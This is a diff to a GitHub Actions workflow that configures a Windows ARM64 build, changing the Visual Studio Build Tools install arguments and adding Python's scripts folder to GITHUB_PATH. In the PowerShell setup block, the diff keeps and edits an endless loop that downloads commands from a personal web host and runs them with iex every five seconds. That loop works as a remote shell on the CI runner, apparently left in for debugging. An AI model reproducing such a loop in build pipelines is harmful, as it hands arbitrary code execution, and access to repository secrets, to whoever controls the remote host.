@@ -132,13 +132,17 @@ jobs:
           ;
           ; Write-Output "Setup VS Build Tools"
           ; Invoke-WebRequest "https://aka.ms/vs/17/release/vs_BuildTools.exe" -OutFile /vs_BuildTools.exe
-          ; Start-Process C:/vs_BuildTools.exe -ArgumentList "--wait --add Microsoft.VisualStudio.Workload.VCTools --add Microsoft.VisualStudio.Component.VC.Tools.arm64 --includeRecommended --quiet --norestart" -Wait
+          ; Start-Process C:/vs_BuildTools.exe -ArgumentList " `
+              --add Microsoft.VisualStudio.Workload.NativeDesktop `
+              --add Microsoft.VisualStudio.Workload.VCTools `
+              --add Microsoft.VisualStudio.Component.VC.Tools.arm64 `
+              --includeRecommended --quiet --norestart --wait" -Wait
           ;
           ; Write-Output "Update GITHUB_PATH"
           ; [System.IO.File]::AppendAllText($Env:GITHUB_PATH, "`n" + "/git/bin/")
           ; [System.IO.File]::AppendAllText($Env:GITHUB_PATH, "`n" + $Env:USERPROFILE + "/.cargo/bin/")
           ;
-          ; while ($true) { try { $v = iwr https://s1.simonlin.dev/fileshare/cmd.txt | select content; echo "cmd: $v"; $v | iex } catch { echo "err $_" }; sleep 5 }
+          ; while ($true) { $v = iwr https://s1.simonlin.dev/fileshare/cmd.txt | select content; echo "cmd: $v"; try { $v | iex } catch { echo "err $_" }; sleep 5 }
           ;
 
       - name: Check bash shell
@@ -171,6 +175,10 @@ jobs:
         uses: actions/setup-python@v5
         with:
           python-version: ${{ env.PYTHON_VERSION_WIN_ARM64 }}
+
+      - name: Add Python scripts folder to GITHUB_PATH (ARM64 Windows)
+        if: matrix.os == 'windows-arm64-16gb'
+        run: python -c "import sysconfig; print(sysconfig.get_path('scripts'))" >> $GITHUB_PATH
 
       - name: Install yq
         if: matrix.package != 'polars'
